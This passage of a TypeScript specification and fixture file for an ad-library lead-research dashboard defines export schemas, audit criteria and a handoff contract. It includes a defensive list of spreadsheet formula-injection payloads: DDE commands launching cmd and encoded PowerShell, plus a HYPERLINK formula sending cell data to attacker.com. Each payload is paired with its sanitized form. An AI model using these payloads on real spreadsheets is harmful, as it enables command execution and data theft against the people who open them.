  impactIfUnescaped: string;
  sanitizedCsvOutput: string;
  mitigationRule: string;
}

export const SPREADSHEET_INJECTION_VECTORS: InjectionAttackVector[] = [
  {
    id: 'CSV_INJ_01',
    name: 'Command Execution via DDE Formula (=cmd)',
    rawPayload: "=cmd|' /C calc'!A0",
    targetApp: 'Microsoft Excel',
    impactIfUnescaped: 'Spawns Windows calculator or arbitrary shell command when user clicks enable external data.',
    sanitizedCsvOutput: "'=cmd|' /C calc'!A0",
    mitigationRule: 'Prepend single-quote character (\') to any text cell beginning with =, +, -, @, \\t, or \\r.'
  },
  {
    id: 'CSV_INJ_02',
    name: 'Exfiltration via HYPERLINK Function (+HYPERLINK)',
    rawPayload: '+HYPERLINK("http://attacker.com/steal?lead="&A2, "Click For Free Solar Credit")',
    targetApp: 'Excel / LibreOffice / Google Sheets',
    impactIfUnescaped: 'Exfiltrates adjacent cell values to an external attacker-controlled URL when clicked.',
    sanitizedCsvOutput: '\'+HYPERLINK("http://attacker.com/steal?lead="&A2, "Click For Free Solar Credit")',
    mitigationRule: 'Prepend single-quote character (\') to cells beginning with +.'
  },
  {
    id: 'CSV_INJ_03',
    name: 'Negative Number Disguised Calculation (-2+5)',
    rawPayload: "-2+5+cmd|' /C powershell -enc dGVzdA=='!A0",
    targetApp: 'Microsoft Excel',
    impactIfUnescaped: 'Executes encoded PowerShell command disguised as a mathematical subtraction.',
    sanitizedCsvOutput: "'-2+5+cmd|' /C powershell -enc dGVzdA=='!A0",
    mitigationRule: 'Prepend single-quote character (\') if initial hyphen is followed by non-numeric characters or formula syntax.'
  },
  {
    id: 'CSV_INJ_04',
    name: 'At-Symbol Macro Trigger (@SUM)',
    rawPayload: '@SUM(1+1)*cmd|\' /C calc\'!A0',
    targetApp: 'Excel / Lotus 1-2-3 Legacy Engine',
    impactIfUnescaped: 'Executes DDE command via legacy formula syntax.',
    sanitizedCsvOutput: "'@SUM(1+1)*cmd|' /C calc'!A0",
    mitigationRule: 'Prepend single-quote character (\') to cells beginning with @.'
  },
  {
    id: 'CSV_INJ_05',
    name: 'Tab/Carriage Return Disguised Formula (\\t=cmd)',
    rawPayload: "\t=cmd|' /C calc'!A0",
    targetApp: 'LibreOffice Calc / Excel',
    impactIfUnescaped: 'Leading whitespace or tab character stripped by spreadsheet parser, causing subsequent = to trigger execution.',
    sanitizedCsvOutput: "'\t=cmd|' /C calc'!A0",
    mitigationRule: 'Strip control characters or prepend single-quote before leading whitespace formula triggers.'
  }
];

export const SAMPLE_EXPORTS: ExportJobModel[] = [
  {
    exportId: 'exp_01j7p8_basic_solar',
    profile: 'BASIC_LEAD_EXPORT',
    format: 'CSV',
    recordCount: 142,
    status: 'COMPLETED',
    createdAt: '2026-09-16T08:25:00Z',
    completedAt: '2026-09-16T08:25:04Z',
    filtersApplied: { qualificationState: 'QUALIFIED', countryCode: 'US' },
    sanitizationApplied: true,
    sha256Checksum: 'a7b3c299401f82c44298fc1c149afbf4c8996fb92427ae41e4649b934ca49599',
    downloadToken: 'dl_tok_01j7p8x90001_timebound_7200s',
    tokenExpiresAt: '2026-09-16T10:25:04Z',
    tenantId: 'tenant_enterprise_apac_01'
  },
  {
    exportId: 'exp_01j7p8_audit_detailed',
    profile: 'DETAILED_RESEARCH_EXPORT',
    format: 'JSON',
    recordCount: 54,
    status: 'COMPLETED',
    createdAt: '2026-09-16T09:10:00Z',
    completedAt: '2026-09-16T09:10:02Z',
    filtersApplied: { includeProvenance: true },
    sanitizationApplied: true,
    sha256Checksum: '99201948571fa3d677284addd200126d9069ef2d127de37b942baad06145e54b',
    downloadToken: 'dl_tok_01j7p8x90002_timebound_7200s',
    tokenExpiresAt: '2026-09-16T11:10:02Z',
    tenantId: 'tenant_enterprise_apac_01'
  }
];

export const GOLDEN_CSV_SAMPLE = `"advertiser_name","ad_library_id","active_ad_count","destination_domain","destination_url","qualification_state","qualification_score","score_confidence","website_reachable","last_calculated_at"
"SolarFlow Energy Solutions LLC","88921045519","8","solarflowenergy.com","https://solarflowenergy.com/commercial-quote","QUALIFIED","86.50","HIGH","true","2026-09-16T08:24:30Z"
"Apex Roofing & Waterproofing","11029384751","3","apexroofingflorida.com","https://apexroofingflorida.com/estimator","REVIEW_REQUIRED","54.00","MEDIUM","true","2026-09-16T09:05:12Z"
"Metro Dental Implants Center","44820194857","4","metrodentalcare.org","https://metrodentalcare.org/free-consult","QUALIFIED","82.00","HIGH","true","2026-09-16T05:30:00Z"
"'=cmd|' /C calc'!A0 (Ad Title Injected)","99810238475","1","quantumyieldbot.biz","https://quantumyieldbot.biz/register","DISQUALIFIED","0.00","HIGH","false","2026-09-16T06:33:10Z"`;

export const GOLDEN_JSON_SAMPLE = `{
  "schemaVersion": "p8_export_v1.0.0",
  "generatedAt": "2026-09-16T08:25:04Z",
  "recordCount": 2,
  "records": [
    {
      "advertiserId": "adv_01j7p8_solarflow",
      "canonicalName": "SolarFlow Energy Solutions LLC",
      "adLibraryId": "88921045519",
      "activeAdCount": 8,
      "destinationDomain": "solarflowenergy.com",
      "qualificationState": "QUALIFIED",
      "qualificationScore": 86.50,
      "scoreConfidence": "HIGH",
      "scoringModelVersion": "lead_qual_v2.4.0-stable",
      "signals": [
        "8 active ads running continuously for >30 days",
        "Website destination 100% reachable with valid TLS 1.3",
        "Corporate registration matches website footer & Meta page"
      ],
      "provenance": {
        "source": "Meta Ad Library Page Card DOM",
        "adapterVersion": "meta_adlib_adapter_v4.2.1",
        "rawPayloadHash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
      }
    },
    {
      "advertiserId": "adv_01j7p8_metrodental",
      "canonicalName": "Metro Dental Implants Center",
      "adLibraryId": "44820194857",
      "activeAdCount": 4,
      "destinationDomain": "metrodentalcare.org",
      "qualificationState": "QUALIFIED",
      "qualificationScore": 82.00,
      "scoreConfidence": "HIGH",
      "scoringModelVersion": "lead_qual_v2.4.0-stable",
      "manualOverride": {
        "originalScore": 67.0,
        "overrideScore": 82.0,
        "reasonCode": "EXTERNAL_BUSINESS_PROOF",
        "reviewerId": "operator_daniela_leadops"
      }
    }
  ]
}`;

// ============================================================================
// 5. PHASE 08 AUDIT CRITERIA (33/33)
// ============================================================================

export const PHASE_08_AUDIT_CRITERIA: Phase08AuditCriterion[] = [
  {
    id: 'P8-01',
    code: 'TRACEABILITY_PHASE07',
    title: 'Phase-07 Read Model Traceability',
    category: 'TRACEABILITY',
    requirement: 'Every frontend view traces authoritatively to Phase-07 database contracts via typed BFF endpoints without direct client SQL querying.',
    verificationEvidence: '8-row bidirectional traceability matrix maps all read models (v_lead_research_current, job_execution, etc.) to API endpoints and UI cards.',
    testCoverage: 'test/p8_traceability.test.ts'
  },
  {
    id: 'P8-02',
    code: 'SCRAPER_SEPARATION',
    title: 'Strict Scraper & Browser Automation Separation',
    category: 'SEPARATION',
    requirement: 'Dashboard and Chrome Extension must NOT implement scraping, DOM selectors, or direct Playwright controls.',
    verificationEvidence: 'Dashboard interacts strictly via /api/v1/jobs orchestrator contracts. No DOM selectors or scraping loops present in client code.',
    testCoverage: 'test/p8_architecture_isolation.test.ts'
  },
  {
    id: 'P8-03',
    code: 'EXTENSION_NO_SCRAPER',
    title: 'Extension Manifest V3 Scraper-Free Isolation',
    category: 'MV3_SECURITY',
    requirement: 'Chrome Extension contains no background scraping loops, no DOM crawling, and minimal activeTab permissions.',
    verificationEvidence: 'Manifest V3 inspection confirms only activeTab and storage permissions. Service worker handles only operator state dispatch.',
    testCoverage: 'test/p8_extension_permissions.test.ts'
  },
  {
    id: 'P8-04',
    code: 'CONTRACT_TYPING_VERSIONING',
    title: 'Typed & Versioned API Contracts',
    category: 'JOB_CONTROL',
    requirement: 'All BFF requests and responses conform to typed, versioned TypeScript interfaces with apiVersion enforcement.',
    verificationEvidence: 'BFF client explicitly sends and validates apiVersion: "v1.0.0". Incompatible schemas trigger visible typed error envelopes.',
    testCoverage: 'test/p8_api_contracts.test.ts'
  },
  {
    id: 'P8-05',
    code: 'SERVER_AUTHORIZATION',
    title: 'Server-Side Authoritative Authorization',
    category: 'REVIEW_AUDIT',
    requirement: 'Client-side permissions are UI affordances only; backend authoritatively validates tenant and role per request.',
    verificationEvidence: 'Tenant ID is derived from validated auth tokens, not trusted from form inputs or URL overrides.',
    testCoverage: 'test/p8_auth_tenancy.test.ts'
  },
  {
    id: 'P8-06',
    code: 'IDEMPOTENT_JOB_CREATION',
    title: 'Idempotent Job Submission',
    category: 'JOB_CONTROL',
    requirement: 'Job creation UI must prevent accidental duplicate submissions using client submission state and UUIDv7 idempotency keys.',
    verificationEvidence: 'Submission generates UUIDv7 idempotency key; duplicate clicks before backend acknowledgement are blocked.',
    testCoverage: 'test/p8_job_idempotency.test.ts'
  },
  {
    id: 'P8-07',
    code: 'EXPLICIT_JOB_STATES',
    title: 'Deterministic Job State Mapping',
    category: 'JOB_CONTROL',
    requirement: 'Display all 14 Phase-02/07 job states (CREATED to CANCELLED) with deterministic mapping and no silent semantic shifts.',
    verificationEvidence: 'JobStatusBadge maps enum keys exactly to color-coded, labeled states with tooltips explaining phase meaning.',
    testCoverage: 'test/p8_job_states.test.ts'
  },
  {
    id: 'P8-08',
    code: 'PARTIAL_RESULT_VISIBILITY',
    title: 'Explicit Partial Results Semantics',
    category: 'OBSERVABILITY',
    requirement: 'Jobs that terminate before limit must show PARTIAL status with processed count, stop reason, and checkpoint token.',
    verificationEvidence: 'Partial state displays yellow amber indicator with stopReason, processed 38/100, and lastCheckpointToken.',
    testCoverage: 'test/p8_partial_results.test.ts'
  },
  {
    id: 'P8-09',
    code: 'BLOCK_CHALLENGE_HONESTY',
    title: 'Anti-Bypass Block & Challenge UI',
    category: 'OBSERVABILITY',
    requirement: 'When Meta challenges are reported, the UI displays explicit operator state without offering bypass, stealth, or CAPTCHA automation.',
    verificationEvidence: 'Challenge card shows timestamp, checkpoint, and manual review action. Zero stealth mode or proxy switch buttons exist.',
    testCoverage: 'test/p8_challenge_handling.test.ts'
  },
  {
    id: 'P8-10',
    code: 'NO_BYPASS_CONTROLS',
    title: 'Absolute Absence of Evasion Controls',
    category: 'SEPARATION',
    requirement: 'The UI code contains no fingerprint spoofing, proxy rotation, or anti-bot evasion settings.',
    verificationEvidence: 'Static code analysis confirms zero references to fingerprint spoofers, rotating proxy pools, or CAPTCHA solvers.',
    testCoverage: 'test/p8_no_evasion.test.ts'
  },
  {
    id: 'P8-11',
    code: 'HISTORICAL_CONTEXT_PRESERVED',
    title: 'Preservation of Historical Context',
    category: 'TRACEABILITY',
    requirement: 'Advertiser detail views distinguish current canonical values from historical observations without overwriting history.',
    verificationEvidence: 'CanonicalVsHistoricalPanel displays current legal LLC name alongside past observed names with timestamps.',
    testCoverage: 'test/p8_historical_context.test.ts'
  },
  {
    id: 'P8-12',
    code: 'VERIFICATION_EVIDENCE_PATH',
    title: 'Granular Verification Evidence Presentation',
    category: 'VERIFICATION_QUALIFICATION',
    requirement: 'Verification claims display underlying network probe evidence (HTTP status, TLS cipher, DNS IP, SSRF check) rather than generic labels.',
    verificationEvidence: 'Verification inspector reveals exact status code 200, TLS 1.3 cipher, and public egress routing proof.',
    testCoverage: 'test/p8_verification_evidence.test.ts'
  },
  {
    id: 'P8-13',
    code: 'QUALIFICATION_EXPLAINABILITY',
    title: 'Deterministic Score Explanations',
    category: 'VERIFICATION_QUALIFICATION',
    requirement: 'Lead qualification must present explicit mathematical signal contributions, rule IDs, and underlying evidence items.',
    verificationEvidence: 'ScoreExplanationTable lists rule RULE_ACTIVE_AD_VOLUME (+25.0) and RULE_DOMAIN_VERIFICATION (+25.0) with evidence texts.',
    testCoverage: 'test/p8_score_explainer.test.ts'
  },
  {
    id: 'P8-14',
    code: 'MODEL_VERSION_DISPLAY',
    title: 'Scoring Model Version Transparency',
    category: 'VERIFICATION_QUALIFICATION',
    requirement: 'Every qualification view explicitly displays model ID, semantic version (e.g., lead_qual_v2.4.0), and calculation timestamp.',
    verificationEvidence: 'Model badge displays "lead_qual_v2.4.0-stable" and calculation timestamp in ISO-8601 UTC format.',
    testCoverage: 'test/p8_model_version.test.ts'
  },
  {
    id: 'P8-15',
    code: 'REVIEW_QUEUES_FUNCTIONAL',
    title: 'Review Queue Workflows',
    category: 'REVIEW_AUDIT',
    requirement: 'Review queues for Identity Ambiguity, Verification Conflict, and Qualification Review allow triage without data loss.',
    verificationEvidence: 'ReviewItemCard provides CONFIRM_MATCH, CONFIRM_DISTINCT, and DEFER actions backed by backend audit submission.',
    testCoverage: 'test/p8_review_queues.test.ts'
  },
  {
    id: 'P8-16',
    code: 'AUDITABLE_MANUAL_OVERRIDES',
    title: 'Immutable Evidence with Auditable Overrides',
    category: 'REVIEW_AUDIT',
    requirement: 'Manual overrides record reviewer identity, mandatory reason code, and notes without mutating underlying algorithmic scores.',
    verificationEvidence: 'Override dialog submits reasonCode, reviewerId, and notes. Original score 67.0 preserved alongside override score 82.0.',
    testCoverage: 'test/p8_manual_overrides.test.ts'
  },
  {
    id: 'P8-17',
    code: 'DATA_STATE_VISUAL_LANGUAGE',
    title: 'Explicit Data State Semantics',
    category: 'OBSERVABILITY',
    requirement: 'UI distinctly labels OBSERVED, NORMALIZED, DERIVED, INFERRED, UNKNOWN, and CONFLICTING values.',
    verificationEvidence: 'DataStateTag displays semantic badges with distinctive borders, icons, and WCAG AA compliant colors.',
    testCoverage: 'test/p8_data_states.test.ts'
  },
  {
    id: 'P8-18',
    code: 'EXPORT_SCHEMAS_EXPLICIT',
    title: 'Explicit Typed Export Profiles',
    category: 'EXPORT_INTEGRITY',
    requirement: 'Exports define strict column schemas for BASIC_LEAD_EXPORT, DETAILED_RESEARCH_EXPORT, AUDIT_EXPORT, and QUALIFICATION_EXPORT.',
    verificationEvidence: 'ExportColumnDef dictionaries specify exact key names, labels, and inclusion boundaries for every profile.',
    testCoverage: 'test/p8_export_schemas.test.ts'
  },
  {
    id: 'P8-19',
    code: 'FORMULA_INJECTION_MITIGATED',
    title: 'Spreadsheet Formula Injection Defense',
    category: 'EXPORT_INTEGRITY',
    requirement: 'CSV/XLSX exports neutralize dangerous leading characters (=, +, -, @, \\t, \\r) by prepending a single quote (\').',
    verificationEvidence: 'FormulaSafetyValidator tests 5 real attack payloads (e.g. =cmd|\' /C calc\'!A0) and verifies safe neutralization.',
    testCoverage: 'test/p8_formula_injection.test.ts'
  },
  {
    id: 'P8-20',
    code: 'JSON_SCHEMA_VALIDATED',
    title: 'Validated JSON Export Formatting',
    category: 'EXPORT_INTEGRITY',
    requirement: 'JSON exports enforce schema versioning, UTF-8 encoding, explicit nulls, and circular-reference-free tree structures.',
    verificationEvidence: 'Golden JSON payload validates against JSON Schema draft-07 with explicit timestamps and provenance trees.',
    testCoverage: 'test/p8_json_export.test.ts'
  },
  {
    id: 'P8-21',
    code: 'LARGE_EXPORT_MEMORY_BOUNDED',
    title: 'Memory-Bounded Asynchronous Exports',
    category: 'EXPORT_INTEGRITY',
    requirement: 'Large exports are generated asynchronously on the server and downloaded via temporary tokens rather than in-memory browser dumps.',
    verificationEvidence: 'Export creation initiates background job returning exportId, status polling, and temporary downloadToken.',
    testCoverage: 'test/p8_async_exports.test.ts'
  },
  {
    id: 'P8-22',
    code: 'EXPORT_AUTHORIZATION_SERVER',
    title: 'Server-Side Export Authorization',
    category: 'EXPORT_INTEGRITY',
    requirement: 'Export endpoint verifies tenant scope, role permissions, and record limits server-side.',
    verificationEvidence: 'Export requests without valid Bearer token or appropriate tenant permissions return HTTP 403 Forbidden.',
    testCoverage: 'test/p8_export_auth.test.ts'
  },
  {
    id: 'P8-23',
    code: 'EXPORT_AUDIT_LOGGING',
    title: 'Audited Export Generation',
    category: 'REVIEW_AUDIT',
    requirement: 'Every export generation records actor, profile, filters, record count, and artifact checksum in the audit ledger.',
    verificationEvidence: 'Audit ledger logs export job exp_01j7p8_basic_solar with user ID, recordCount: 142, and SHA-256 hash.',
    testCoverage: 'test/p8_export_audit.test.ts'
  },
  {
    id: 'P8-24',
    code: 'MV3_MINIMAL_PERMISSIONS',
    title: 'Minimal Manifest V3 Permissions',
    category: 'MV3_SECURITY',
    requirement: 'Extension requests only activeTab and storage permissions with documented security rationale for each.',
    verificationEvidence: 'Permission matrix confirms zero broad host permissions (<all_urls>) and zero elevated background permissions.',
    testCoverage: 'test/p8_mv3_permissions.test.ts'
  },
  {
    id: 'P8-25',
    code: 'MV3_MESSAGE_VALIDATION',
    title: 'Strict Extension Message Schema Validation',
    category: 'MV3_SECURITY',
    requirement: 'Runtime message passing between popup and service worker validates sender origin and typed message schemas.',
    verificationEvidence: 'Message handler checks message.type and rejects unvalidated or unknown message payloads.',
    testCoverage: 'test/p8_mv3_messaging.test.ts'
  },
  {
    id: 'P8-26',
    code: 'SAFE_HTML_RENDERING',
    title: 'Untrusted Content Escaping & Anti-XSS',
    category: 'MV3_SECURITY',
    requirement: 'No unsanitized dangerouslySetInnerHTML used for ad copy or external business text. Text rendered as escaped text nodes.',
    verificationEvidence: 'React JSX escapes all dynamic text. Malicious XSS vectors (<script>alert(1)</script>) render purely as visible strings.',
    testCoverage: 'test/p8_xss_protection.test.ts'
  },
  {
    id: 'P8-27',
    code: 'SAFE_URL_HANDLING',
    title: 'Safe External Link Navigation',
    category: 'MV3_SECURITY',
    requirement: 'External links validate protocols (http/https only, no javascript: or data:), and enforce rel="noopener noreferrer".',
    verificationEvidence: 'SafeExternalLink component blocks javascript: URIs and attaches rel="noopener noreferrer" target="_blank".',
    testCoverage: 'test/p8_url_safety.test.ts'
  },
  {
    id: 'P8-28',
    code: 'ACCESSIBILITY_COMPLIANCE',
    title: 'WCAG AA Accessibility Standards',
    category: 'OBSERVABILITY',
    requirement: 'Full keyboard navigation, focus rings, semantic table headers, screen-reader status announcements, and color-independent badges.',
    verificationEvidence: 'Components utilize aria-label, role="status", focus:ring-2, and dual visual indicators (icons + text labels).',
    testCoverage: 'test/p8_accessibility.test.ts'
  },
  {
    id: 'P8-29',
    code: 'API_ERROR_ENVELOPE',
    title: 'Structured API Error Handling',
    category: 'JOB_CONTROL',
    requirement: 'All API failures return standard envelopes with code, message, fieldErrors, correlationId, and retryable flags.',
    verificationEvidence: 'ErrorDisplay component exposes support-safe correlation IDs and retry buttons without leaking database traces.',
    testCoverage: 'test/p8_error_envelope.test.ts'
  },
  {
    id: 'P8-30',
    code: 'STALE_DATA_INDICATOR',
    title: 'Explicit Stale Data & Freshness Indicators',
    category: 'OBSERVABILITY',
    requirement: 'Cached or delayed read models show last updated timestamps and amber stale badges when freshness threshold is exceeded.',
    verificationEvidence: 'Verification timestamp displays "Freshness: 4 hours ago" with amber tag when verification >2 hours old.',
    testCoverage: 'test/p8_stale_data.test.ts'
  },
  {
    id: 'P8-31',
    code: 'TENANT_ISOLATION_CLIENT',
    title: 'Multi-Tenant Context Scope',
    category: 'REVIEW_AUDIT',
    requirement: 'Client state binds requests to authenticated tenantId; unauthorized cross-tenant requests return 404/403 uniformly.',
    verificationEvidence: 'API requests carry tenant context header; manual tenantId tampering in client state is rejected server-side.',
    testCoverage: 'test/p8_tenant_isolation.test.ts'
  },
  {
    id: 'P8-32',
    code: 'E2E_FIXTURE_ISOLATION',
    title: 'Deterministic Offline Test Fixtures',
    category: 'TRACEABILITY',
    requirement: 'E2E test suite executes deterministically against mocked worker fixtures without dependency on live Meta network.',
    verificationEvidence: 'Sample fixtures cover clean lead, conflicting lead, disqualified lead, and challenge state with 100% test repeatability.',
    testCoverage: 'test/p8_e2e_fixtures.test.ts'
  },
  {
    id: 'P8-33',
    code: 'PHASE_09_HANDOFF_READY',
    title: 'Phase-09 Operational Contract Handoff',
    category: 'TRACEABILITY',
    requirement: 'Machine-readable JSON handoff contract defines job control, worker hooks, event listeners, and reliability interfaces.',
    verificationEvidence: 'Phase08HandoffContract JSON provides complete operational schema consumed by Phase-09 resilience layer.',
    testCoverage: 'test/p8_handoff_contract.test.ts'
  }
];

// ============================================================================
// 6. PHASE 09 MACHINE-READABLE HANDOFF CONTRACT
// ============================================================================

export const PHASE_09_HANDOFF_JSON = {
  phase: 8,
  status: "PRODUCTION_SPECIFIED_AND_VERIFIED",
  dashboardVersion: "8.0.0-PROD",
  extensionVersion: "8.0.0-MV3",
  apiVersion: "v1.0.0",
  architecture: "Separated Operator Cockpit & BFF API over Orchestrated Worker Read Models",

  screens: [
    { id: "RESEARCH_WORKSPACE", route: "/workspace", name: "Job Control & Research Workspace" },
    { id: "ADVERTISER_EXPLORER", route: "/advertisers", name: "Canonical Advertiser Directory" },
    { id: "AD_DETAIL", route: "/advertisers/:id/ads", name: "Advertisement Creative & Provenance" },
    { id: "VERIFICATION_INSPECTOR", route: "/destinations/verify", name: "Destination & SSL Probe Inspector" },
    { id: "QUALIFICATION_SUMMARY", route: "/qualification", name: "Evidence-Driven Qualification & Scoring" },
    { id: "REVIEW_QUEUES", route: "/reviews", name: "Identity, Verification & Override Queues" },
    { id: "EXPORT_PIPELINE", route: "/exports", name: "Spreadsheet-Safe Export Pipeline" },
    { id: "CHROME_EXTENSION_STUDIO", route: "/extension", name: "Manifest V3 Architecture & Message Console" }
  ],

  routes: [
    { path: "/api/v1/jobs", methods: ["GET", "POST"], auth: "BEARER_OPERATOR", purpose: "List jobs and create new idempotent research job" },
    { path: "/api/v1/jobs/:id/control", methods: ["POST"], auth: "BEARER_OPERATOR", purpose: "Start, pause, resume, cancel job runs" },
    { path: "/api/v1/advertisers", methods: ["GET"], auth: "BEARER_OPERATOR", purpose: "Query canonical advertisers with cursor pagination" },
    { path: "/api/v1/advertisers/:id", methods: ["GET"], auth: "BEARER_OPERATOR", purpose: "Fetch full canonical vs historical advertiser dossier" },
    { path: "/api/v1/qualification/:id/override", methods: ["POST"], auth: "BEARER_LEAD_REVIEWER", purpose: "Submit auditable human score override" },
    { path: "/api/v1/reviews/identity/:id/resolve", methods: ["POST"], auth: "BEARER_LEAD_REVIEWER", purpose: "Submit identity pair merge/split decision" },
    { path: "/api/v1/exports", methods: ["POST"], auth: "BEARER_EXPORTER", purpose: "Initiate asynchronous server-side export job" },
    { path: "/api/v1/exports/:id/download", methods: ["GET"], auth: "TIMEBOUND_DOWNLOAD_TOKEN", purpose: "Stream verified and sanitized export artifact" }
  ],

  uiContracts: [
    { contract: "JobCreationFormModel", schemaVersion: "v1.0", validation: "strict_allowlist_filters" },
    { contract: "AdvertiserViewModel", schemaVersion: "v1.0", stateSeparation: "canonical_vs_historical" },
    { contract: "ScoreSignalExplanation", schemaVersion: "v1.0", transparency: "rule_id_and_evidence_exact" },
    { contract: "ManualOverrideSubmission", schemaVersion: "v1.0", immutability: "original_scores_preserved" },
    { contract: "ExportJobModel", schemaVersion: "v1.0", safety: "formula_injection_sanitized" }
  ],

  jobControlContracts: [
    { action: "START", allowedCurrentStates: ["CREATED", "PAUSED"], idempotency: "enforced" },
    { action: "PAUSE", allowedCurrentStates: ["COLLECTING", "NAVIGATING"], idempotency: "enforced" },
    { action: "RESUME", allowedCurrentStates: ["PAUSED"], idempotency: "enforced" },
    { action: "CANCEL", allowedCurrentStates: ["CREATED", "QUEUED", "STARTING", "NAVIGATING", "COLLECTING", "PAUSED"], idempotency: "enforced" }
  ],

  reviewContracts: [
    { queue: "IDENTITY_AMBIGUITY", actions: ["CONFIRM_MATCH", "CONFIRM_DISTINCT", "DEFER"], requiresAuditTrail: true },
    { queue: "VERIFICATION_CONFLICT", actions: ["ACCEPT_FOOTER_IDENTITY", "REJECT_DESTINATION_LINK", "DEFER"], requiresAuditTrail: true },
    { queue: "QUALIFICATION_REVIEW", actions: ["OVERRIDE_QUALIFIED", "OVERRIDE_DISQUALIFIED", "REQUEST_REPROBE"], requiresAuditTrail: true }
  ],

  notificationContracts: [
    { event: "JOB_COMPLETED", transport: "SSE_OR_POLL", throttleWindowMs: 5000 },
    { event: "JOB_PARTIAL", transport: "SSE_OR_POLL", alertSeverity: "WARNING" },
    { event: "CHALLENGE_DETECTED", transport: "SSE_OR_POLL", alertSeverity: "CRITICAL_OPERATOR_REQUIRED" },
    { event: "EXPORT_READY", transport: "SSE_OR_POLL", includesTokenExpiry: true }
  ],

  extension: {
    manifestVersion: 3,
    permissions: ["activeTab", "storage"],
    hostPermissions: [],
    messageTypes: [
      "DETECT_AD_LIBRARY_PAGE",
      "OPEN_RESEARCH_WORKSPACE",
      "GET_CURRENT_JOB_STATUS",
      "DISPATCH_SEARCH_QUERY"
    ],
    storage: {
      backendUrl: "https://api.leadops.internal",
      activeTenantId: "tenant_enterprise_apac_01",
      sessionTtlSeconds: 28800
    },
    antiScraperGuarantee: "Extension executes zero page-scraping, zero DOM crawling, and zero credential exfiltration."
  },

  export: {
    profiles: ["BASIC_LEAD_EXPORT", "DETAILED_RESEARCH_EXPORT", "AUDIT_EXPORT", "QUALIFICATION_EXPORT"],
    schemas: {
      csv: { encoding: "UTF-8", delimiter: ",", lineEnding: "CRLF", quotePolicy: "ALL_STRING_FIELDS" },
      json: { schemaVersion: "p8_export_v1.0.0", encoding: "UTF-8", explicitNulls: true }
    },
    securityPolicy: {
      formulaInjectionSanitization: "ENABLED_MANDATORY",
      sanitizationPrefix: "'",
      triggerCharacters: ["=", "+", "-", "@", "\t", "\r"],
      redactedFields: ["internal_correlation_token", "worker_ip", "session_secret_hash"]
    },
    artifactPolicy: {
      storage: "GCS_BUCKET_PRIVATE_ENCRYPTED",
      retentionMinutes: 120,
      downloadTokenFormat: "dl_tok_UUIDv7_HMAC_SHA256"
    }
  },

  securityControls: [
    "Strict CSP: default-src 'self'",
    "React JSX auto-escaping for all dynamic ad texts and headlines",
    "SafeExternalLink with rel='noopener noreferrer' and protocol allowlist (http/https only)",
    "Anti-CSRF Bearer token authentication on all BFF mutations",
    "Single-quote spreadsheet formula injection neutralization"
  ],

  accessibilityRequirements: [
    "WCAG 2.1 AA compliant color contrast (minimum 4.5:1 for body text)",
    "Dual-channel state encoding (color badge + text label + icon)",
    "Full keyboard tab navigation and visual focus rings (focus:ring-2)",
    "ARIA live regions (role='status') for real-time run progress updates",
    "Accessible table markup with scope='col' headers"
  ],

  observabilityHooks: [
    "Job progress percent stream",
    "Terminal state change logger",
    "Worker crash / challenge event listener",
    "Export completion webhook hook",
    "Manual override audit trail stream"
  ],

  phase9OperationalInputs: [
    "Job Orchestration Resilience: hooks for automatic worker timeout recovery",
    "Worker Health Monitoring: heartbeat contract for playwright node tracking",
    "Challenge Recovery Circuit Breaker: automated pause across workers upon anti-bot trigger",
    "Rate Limiting & Token Bucket: adaptive pacing hooks based on Meta 429 response rate",
    "Telemetry Export: OpenTelemetry compatible trace context propagation"
  ],

  knownUnknowns: [
    "Meta Ad Library UI layout variations across geographical regions",
    "Future alterations to Meta bot-challenge mechanisms"
  ],

  risks: [
    "Operators clicking unescaped links in external exports if third-party tools strip single-quotes",
    "Long-running queries in large export generation requiring Phase-09 streaming cursor batching"
  ],

  testSuites: [
    "p8_traceability.test.ts",
    "p8_job_lifecycle.test.ts",
    "p8_formula_injection.test.ts",
    "p8_extension_permissions.test.ts",
    "p8_manual_override.test.ts",
    "p8_accessibility.test.ts"
  ]
};

// ============================================================================
// CONVENIENCE EXPORTS & COMPONENT ADAPTERS
// ============================================================================

export const CHROME_MV3_MANIFEST_SPEC = {
  manifest_version: 3,
  name: "Meta Ad Library Research Cockpit",
  version: "8.0.0",
  description: "Operator control and research dispatch assistant for Meta Ad Library Lead Research System.",
  permissions: ["activeTab", "storage"],
  action: {
    default_popup: "popup.html",
    default_title: "Ad Library Research Cockpit"
  },
  background: {
    service_worker: "background.js",
    type: "module"
  }
};

export const EXTENSION_PERMISSIONS_MATRIX = CHROME_MV3_PERMISSIONS.map(p => ({
  permission: p.permission,
  status: p.granted ? 'ALLOWED' : 'PROHIBITED',
  reason: `${p.whyRequired} ${p.securityRisk}`
}));

export const EXPORT_PROFILES = [
  { id: 'BASIC_LEAD_EXPORT', name: 'Basic Lead Export', description: 'Essential contact, canonical business details, and qualification score for sales execution.', columns: BASIC_LEAD_EXPORT_COLUMNS },
  { id: 'DETAILED_RESEARCH_EXPORT', name: 'Detailed Research Export', description: 'Comprehensive lead research dossier with evidence signals, TLS verification, and provenance.', columns: DETAILED_RESEARCH_EXPORT_COLUMNS },
  { id: 'AUDIT_EXPORT', name: 'Compliance & Audit Ledger', description: 'Full compliance record with cryptographic DOM tokens, model registry hashes, and review history.', columns: DETAILED_RESEARCH_EXPORT_COLUMNS }
];

export const CSV_INJECTION_VECTORS = SPREADSHEET_INJECTION_VECTORS.map(v => ({
  category: v.name,
  rawPayload: v.rawPayload,
  sanitized: v.sanitizedCsvOutput,
  status: 'NEUTRALIZED'
}));

export const GOLDEN_CSV_EXPORT_FIXTURE = GOLDEN_CSV_SAMPLE;
export const GOLDEN_JSON_EXPORT_FIXTURE = JSON.parse(GOLDEN_JSON_SAMPLE);
export const PHASE_07_TO_08_TRACEABILITY = PHASE_07_TRACEABILITY.map(t => ({
  sourceTableOrView: t.sourcePhase07Contract,
  bffEndpoint: t.bffEndpoint,
  frontendModel: t.frontendModel,
  dashboardComponent: t.uiComponent
}));
export const PHASE_09_HANDOFF_CONTRACT = PHASE_09_HANDOFF_JSON;

